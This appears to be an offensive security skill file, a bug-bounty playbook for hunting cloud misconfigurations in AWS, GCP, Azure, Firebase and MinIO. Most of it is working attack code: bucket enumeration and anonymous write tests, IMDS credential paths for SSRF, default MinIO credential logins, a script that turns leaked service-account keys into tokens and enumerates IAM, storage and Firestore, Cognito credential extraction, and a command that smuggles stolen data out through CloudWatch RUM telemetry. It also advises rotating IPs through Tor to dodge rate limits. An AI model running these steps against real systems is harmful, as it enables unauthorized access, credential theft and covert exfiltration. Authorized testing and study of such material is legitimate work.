---
name: hunt-cloud-misconfig
description: "Hunt cloud / infrastructure misconfigurations. AWS: public S3 buckets (s3:GetObject anonymous), permissive bucket policies (PutObjectAcl public-write), exposed CloudFront origin, public Lambda function URL, public RDS snapshot, IAM credentials in JS bundles, AWS metadata accessible via SSRF, Cognito identity pool abuse, CloudWatch RUM weaponization. GCP: public GCS buckets, exposed Cloud Run services, Cloud Functions unauth access, Firestore open rules, leaked service account JSON → token generation → IAM enumeration, Artifact Registry image download, source code buckets (gcf-sources-*). Azure: public blob containers, exposed Function App. MinIO: health/admin API, default credentials, bucket listing. (Kubernetes/Docker exposure is owned by hunt-k8s; CI/CD pipeline attacks by hunt-cicd.) Detection: targeted dorking, certificate transparency, JS bundle secret extraction, port scan for known service ports. Validate: actual data read / write / RCE. Use when hunting cloud-native storage and compute misconfig (S3/GCS/Blob, IMDS-via-SSRF, serverless, public managed services)."
sources: field_recon, aws_docs, gcp_docs, azure_docs, hackingthecloud
report_count: 43
---

# HUNT-CLOUD-MISCONFIG — Cloud / Infrastructure Misconfigurations

## Crown Jewel Targets

### S3 / GCS / Azure Blob
```bash
# S3 listing
curl -s "https://TARGET-NAME.s3.amazonaws.com/?max-keys=10"
aws s3 ls s3://target-bucket-name --no-sign-request

# Try common bucket names
for name in target target-backup target-assets target-prod target-staging; do
  curl -s -o /dev/null -w "$name: %{http_code}\n" "https://$name.s3.amazonaws.com/"
done

# Firebase open rules
curl -s "https://TARGET-APP.firebaseio.com/.json"   # read
curl -s -X PUT "https://TARGET-APP.firebaseio.com/test.json" -d '"pwned"'  # write
```

### S3 Bucket Upload Testing
```bash
# Upload (if writable)
curl -X PUT "http://bucket-name.s3.amazonaws.com/test.txt" \
  -H "Content-Type: text/plain" -d "pwned"

# Test common bucket names
for b in "target" "target-prod" "target-dev" "target-images" "target-uploads" \
         "target-backup" "target-media" "download.target.com" "static.target.com"; do
  r=$(curl -sk -o /dev/null -w "%{http_code}" "https://$b.s3.amazonaws.com/" 2>/dev/null)
  [ "$r" != "404" ] && echo "$b -> HTTP $r"
done
```

### EC2 Metadata (via SSRF)
```bash
http://169.254.169.254/latest/meta-data/iam/security-credentials/  # role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME  # keys
```

### Exposed Admin Panels
```
/jenkins  /grafana  /kibana  /elasticsearch  /swagger-ui.html
/phpMyAdmin  /.env  /config.json  /api-docs  /server-status
```

---
## GCP Cloud Functions — Deep Exploitation

### Cloud Functions URL Patterns
```
https://{REGION}-{PROJECT_ID}.cloudfunctions.net/{FUNCTION_NAME}
https://us-central1-{PROJECT_ID}.cloudfunctions.net/api/feed
```

### PROJECT_ID Discovery
```python
projects = ["empresa", "empresa-app", "empresa-prod", "empresa-dev",
            "empresa-1", "empresa-12345", "app-empresa", "admin-1a2b3"]
regions = ["us-central1", "us-east1", "southamerica-east1", "europe-west1"]

for proj in projects:
    for region in regions:
        url = f"https://{region}-{proj}.cloudfunctions.net/api/feed?limit=1"
        try:
            r = requests.get(url, timeout=5)
            if r.status_code != 404 and len(r.text) > 20:
                print(f"DONE {url} -> {r.status_code}")
        except:
            pass
```

### Testing HTTP Methods Without Auth
```python
methods = {
    "GET": requests.get,
    "POST": lambda u: requests.post(u, json={"test": "test"}),
    "PUT": lambda u: requests.put(u, json={"test": "test"}),
    "DELETE": lambda u: requests.delete(u),
}

for method_name, method_func in methods.items():
    try:
        r = method_func(url)
        if r.status_code not in [401, 403, 404, 405]:
            print(f"WARN {method_name} {url} -> {r.status_code} (ACCEPTED!)")
    except:
        pass
```

### Source Code Buckets (gcf-sources-*)
```
gcf-sources-{PROJECT_NUMBER}-{REGION}
gcf-v2-sources-{PROJECT_NUMBER}-{REGION}
```

With SA key read permission:
```javascript
const {Storage} = require('@google-cloud/storage');
const storage = new Storage({credentials: sa});
const bucket = storage.bucket('gcf-sources-706681009423-us-central1');
const [files] = await bucket.getFiles();
for (const f of files.filter(f => f.name.endsWith('.zip'))) {
    await f.download({destination: '/tmp/' + f.name.replace(/\//g, '_')});
}
```

---
## GCP Service Account Key → IAM Escalation

### SA Key → GCP Token Generation
```python
import json, base64, time, requests
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding as pad
from cryptography.hazmat.backends import default_backend

def get_gcp_token(sa_key):
    """Generates a GCP access token from an SA key."""
    now = int(time.time())
    header = base64.urlsafe_b64encode(
        json.dumps({"alg":"RS256","typ":"JWT"}).encode()
    ).rstrip(b'=').decode()
    claims = {
        "iss": sa_key['client_email'],
        "scope": "https://www.googleapis.com/auth/cloud-platform",
        "aud": sa_key['token_uri'],
        "iat": now,
        "exp": now + 3600
    }
    payload = base64.urlsafe_b64encode(json.dumps(claims).encode()).rstrip(b'=').decode()
    key = serialization.load_pem_private_key(
        sa_key['private_key'].encode(), password=None, backend=default_backend()
    )
    signature = base64.urlsafe_b64encode(
        key.sign(f'{header}.{payload}'.encode(), pad.PKCS1v15(), hashes.SHA256())
    ).rstrip(b'=').decode()

    resp = requests.post(sa_key['token_uri'],
        data=f'grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion={header}.{payload}.{signature}'.encode(),
        headers={'Content-Type':'application/x-www-form-urlencoded'}, timeout=10)
    return resp.json()['access_token']

# List IAM policy (find owners/admins)
r = requests.get(
    f'https://cloudresourcemanager.googleapis.com/v1/projects/{project_id}:getIamPolicy',
    headers={'Authorization': f'Bearer {token}'}
)
for binding in r.json().get('bindings', []):
    if binding['role'] in ['roles/owner', 'roles/editor']:
        print(f"ROLE {binding['role']}: {binding['members']}")

# List Storage buckets
r = requests.get(
    f'https://storage.googleapis.com/storage/v1/b?project={project_id}',
    headers={'Authorization': f'Bearer {token}'}
)
for bucket in r.json().get('items', []):
    print(f"BUCKET {bucket['name']}")

# Test Firestore access
r = requests.get(
    f'https://firestore.googleapis.com/v1/projects/{project_id}/databases/(default)/documents',
    headers={'Authorization': f'Bearer {token}'}
)
if r.status_code == 200:
    print("FIRESTORE ACCESSIBLE")
```

---
## Firebase Deep Exploitation

### Firebase Open SignUp
```bash
curl -s "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@domain.com","password":"Senha123!","returnSecureToken":true}'
```

### Firestore Public Access Test
```bash
curl -s "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/users?key=$API_KEY"
curl -s "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/stores?key=$API_KEY"

# Test WRITE
curl -X PATCH "https://firestore.googleapis.com/v1/projects/$PROJECT_ID/databases/(default)/documents/stores/ID?updateMask.fieldPaths=fieldName" \
  -H "Content-Type: application/json" \
  -d '{"fields":{"fieldName":{"stringValue":"test"}}}'
```

---
## GCP Cloud Run & Artifact Registry

### Cloud Run Service Listing
```javascript
const {v2} = require('@google-cloud/run');
const client = new v2.ServicesClient({credentials: sa});
const [services] = await client.listServices({
    parent: 'projects/' + projectId + '/locations/us-central1'
});
for (const svc of services) {
    console.log(svc.name, svc.uri, svc.ingress);
}
```

### Artifact Registry Image Download and Analysis
```python
# List repositories
r = requests.get(
    f'https://artifactregistry.googleapis.com/v1/projects/{project}/locations/{region}/repositories',
    headers={'Authorization': f'Bearer {token}'}
)

# Download specific image manifest
digest = "sha256:XXXXX"
r = requests.get(
    f'https://{region}-docker.pkg.dev/v2/{project}/{repo}/{image}/manifests/{digest}',
    headers={'Authorization': f'Bearer {token}',
             'Accept': 'application/vnd.docker.distribution.manifest.v2+json'}
)

# Download layers
for i, layer in enumerate(r.json().get('layers', [])):
    r2 = requests.get(
        f'https://{region}-docker.pkg.dev/v2/{project}/{repo}/{image}/blobs/{layer["digest"]}',
        headers={'Authorization': f'Bearer {token}'}
    )
    with open(f'/tmp/layer_{i}.tar.gz', 'wb') as f:
        f.write(r2.content)
```

---
## MinIO

```bash
# Health check
curl -sI "http://host:9000/minio/health/live"

# Admin API
curl -s "http://host:9000/minio/admin/v3/info"

# Web console login (port 9001)
curl -X POST "http://host:9001/api/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"accessKey":"minioadmin","secretKey":"minioadmin"}'

# List bucket objects
curl -s "http://host:9000/bucket-name?list-type=2"

# Upload
curl -X PUT "http://host:9000/bucket-name/file.html" \
  -H "Content-Type: text/html; charset=utf-8" -d "<h1>Pwned</h1>"
```

### Azure Blob Storage
```bash
# URL pattern: https://{storage_account}.blob.core.windows.net/{container}
curl -s "https://storageaccount.blob.core.windows.net/container?restype=container&comp=list"
```

---
## Local-verification toolchain

For testing cloud-misconfig findings against a local AWS sim before/instead of hitting real cloud:

```bash
# LocalStack 3.0 community (pin the version — 4.x requires a Pro license)
docker run -d --name lab-localstack -p 14566:4566 localstack/localstack:3.0

# awscli ≥ 2.30 + LocalStack 3.0 incompatibility workaround (x-amz-trailer header):
export AWS_REQUEST_CHECKSUM_CALCULATION=when_required
export AWS_RESPONSE_CHECKSUM_VALIDATION=when_required
export AWS_ENDPOINT_URL=http://localhost:14566
export AWS_ACCESS_KEY_ID=test AWS_SECRET_ACCESS_KEY=test AWS_DEFAULT_REGION=us-east-1
```

---
## CloudWatch RUM Weaponization (2024-2026 surface)

AWS CloudWatch RUM (Real-User Monitoring) is a client-side telemetry service launched late 2021. Customers embed a JS snippet on their pages that sends performance/error events to `dataplane.rum.<region>.amazonaws.com`. The snippet's `AppMonitor` config contains an `identityPoolId` (Cognito) and `guestRoleArn` (IAM role) — both **public by design**. The IAM role policy is the security boundary, and when developers leave it broader than the documented minimum (`rum:PutRumEvents` on the AppMonitor ARN), the entire pool becomes the unauthenticated AWS-credential vending machine.

### Detection — JS bundle fingerprints

**Snippet-style (most common, embedded in `<head>`):**
```javascript
(function(n,i,v,r,s,c,x,z){...})(
  'cwr',
  '00000000-0000-0000-0000-000000000000',                       // applicationId (UUID)
  '1.0.0',
  'us-east-1',
  'https://client.rum.us-east-1.amazonaws.com/1.x/cwr.js',
  {
    sessionSampleRate: 1,
    guestRoleArn: "arn:aws:iam::123456789012:role/RUM-Monitor-...-Unauth",
    identityPoolId: "us-east-1:abcd1234-...",
    endpoint: "https://dataplane.rum.us-east-1.amazonaws.com",
    telemetries: ["errors","performance","http"]
  }
);
```

**NPM-style (aws-rum-web package):**
```javascript
import { AwsRum, AwsRumConfig } from 'aws-rum-web';
const config: AwsRumConfig = { identityPoolId, endpoint, guestRoleArn, ... };
const awsRum = new AwsRum(APPLICATION_ID, '1.0.0', AWS_REGION, config);
```

### Regex set for recon

```bash
# Detect RUM init
grep -REn "cwr\(['\"]init['\"]|from\s+['\"]aws-rum-web['\"]|new\s+AwsRum\(" .

# Extract applicationId (UUID v4)
grep -ErohE "applicationId['\"]?\s*[:=]\s*['\"]([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})['\"]" .

# Extract identityPoolId (region:UUID)
grep -ErohE "identityPoolId['\"]?\s*[:=]\s*['\"]([a-z]{2}-[a-z]+-[0-9]+:[0-9a-f-]{36})['\"]" .

# Extract guestRoleArn (leaks AWS account ID + role name)
grep -ErohE "guestRoleArn['\"]?\s*[:=]\s*['\"]arn:aws:iam::[0-9]{12}:role/[A-Za-z0-9._/-]+['\"]" .

# Endpoint reveals region
grep -ErohE "dataplane\.rum\.[a-z0-9-]+\.amazonaws\.com" .
```

### Attack chains

**Chain A — Credential extraction (Critical when guestRole is over-permissioned).** Once `identityPoolId` is extracted from the page, anyone runs:

```bash
aws cognito-identity get-id \
  --identity-pool-id "us-east-1:abcd1234-..." \
  --region us-east-1 --no-sign-request
aws cognito-identity get-credentials-for-identity \
  --identity-id "us-east-1:<returned-uuid>" \
  --region us-east-1 --no-sign-request
# → STS creds; export and:
aws sts get-caller-identity        # confirm role
aws s3 ls; aws dynamodb list-tables; aws lambda list-functions; aws ssm describe-parameters; aws secretsmanager list-secrets
# Automate: pacu / enumerate-iam.py
```

**Chain B — Telemetry endpoint covert exfil.** `dataplane.rum.<region>.amazonaws.com` is an AWS-owned domain on every enterprise allowlist:
```bash
aws rum put-rum-events \
  --id $(uuidgen) \
  --app-monitor-details '{"id":"<appId>","version":"1.0.0"}' \
  --user-details '{"userId":"EXFIL_PAYLOAD_HERE","sessionId":"<session>"}' \
  --rum-events '[{"id":"'$(uuidgen)'","timestamp":'$(date +%s)',"type":"com.amazon.rum.custom_event","details":"{\"exfil\":\"<base64 of stolen data>\"}"}]' \
  --endpoint-url "https://dataplane.rum.us-east-1.amazonaws.com" \
  --region us-east-1
```

**Chain C — DOM injection via snippet source poisoning.** Subdomain takeover on the JS host or supply-chain compromise gives persistent JS execution on every page-load.

**Chain D — Telemetry injection / dashboard poisoning.** Flood `PutRumEvents` with fake error spikes, inject XSS payloads into page-URL telemetry, inflate billable RUM event counts.

### Severity rubric

| Finding | Severity | Justification |
|---|---|---|
| `guestRoleArn` with `*:*` or wildcards on multiple services | **Critical** (9.1+) | Anonymous full AWS access |
| `guestRoleArn` with `s3:*`, `dynamodb:*`, `secretsmanager:*`, `lambda:Invoke*` on production resources | **High** (7.5-8.8) | Data exfil / RCE depending on resource |
| `guestRoleArn` with `cognito-identity:*` or `iam:PassRole` | **High** (8.0) | Privilege escalation primitive |
| `guestRoleArn` with only `rum:PutRumEvents` + endpoint-scoped resource | **Informational** | Documented, intended config |
| RUM `userDetails` logging PII into events viewable in CloudWatch console | **Medium** (5.3-6.5) | Sensitive data exposure via dashboard sharing |
| RUM AppMonitor accepts `PutRumEvents` from arbitrary internet sources (telemetry injection) | **Low-Medium** (4.3) | Dashboard poisoning, alert evasion, billing DoS |
| Self-hosted `cwr.js` on takeoverable subdomain | **Critical** (9.8) when chained | Persistent stored XSS across every customer page |

### Validation checklist (before reporting)

1. Extract `identityPoolId` from page source.
2. Confirm pool allows unauth identities (`get-id` succeeds without auth).
3. Confirm `get-credentials-for-identity` returns STS creds.
4. Run `aws sts get-caller-identity` and **screenshot the role ARN**.
5. Run `enumerate-iam` / Pacu `iam__enum_permissions` — capture **at least one allowed action beyond `rum:PutRumEvents`**.
6. Demonstrate at least one read/list against a real resource.
7. **Do not** modify/delete data even if permitted — read-only PoC only.

---
## Pitfalls

| Issue | Solution |
|-------|----------|
| SA key revoked | Monitor usage, rotate keys carefully |
| Rate limiting | Space requests, rotate IP via Tor |
| False positive project IDs | Verify with simple GET before deep testing |
| Cloud Run ingress=internal | Only accessible from VPC; need VPN |

---
## Verification

```bash
# Verify SA key works
python3 -c "from google.oauth2 import service_account; creds = service_account.Credentials.from_service_account_file('sa.json'); print(creds.valid)"
# Verify Cloud Function
curl -s "https://us-central1-PROJECT.cloudfunctions.net/FUNC" | head -5
```

---
## Related Skills & Chains

- **`hunt-subdomain`** — Stale CNAMEs pointing to deleted buckets are a takeover gold mine. Chain primitive: Cloud misconfig (S3 public/deleted) + `hunt-subdomain` → unclaimed CNAME points to bucket → `assets.target.com` takeover.
- **`hunt-ssrf`** — Metadata service is reachable only from inside the VPC; SSRF is the bridge. Chain primitive: SSRF + cloud misconfig (IMDSv1 still enabled) → instance role keys → S3/RDS data read.
- **`supply-chain-attack-recon`** — Exposed CI/CD endpoints and SBOMs reveal internal package names. Chain primitive: Exposed Jenkins/GitLab + internal package name leak → npm/PyPI dependency-confusion publish → CI build pwn.
- **`security-arsenal`** — Load the Cloud Bucket Wordlist (target-prod / target-backup / target-staging permutations) and the Admin-Panel Path List for fast enumeration.
- **`triage-validation`** — Apply the Unique-Marker gate: any "writable bucket" claim requires a write of a unique marker file and a read-back from a clean session before report submission.
